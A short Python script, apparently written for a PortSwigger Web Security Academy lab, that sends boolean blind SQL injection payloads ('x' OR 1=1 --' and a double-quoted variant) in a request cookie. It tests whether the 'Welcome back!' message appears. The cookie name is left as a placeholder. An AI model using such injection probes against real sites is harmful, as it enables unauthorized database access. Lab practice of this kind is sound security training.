import urllib.parse
import sys
import requests
from bs4 import BeautifulSoup

site = 'acc11f0e1fee3ba381ff5407003f006d.web-security-academy.net'
url = f'https://{site}/'


def try_query(query):
    print(f'Query: {query}')
    mycookies = {'<FMI>': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


print(try_query("""x' OR 1=1 --"""))
print(try_query("""x" OR 1=1 --"""))
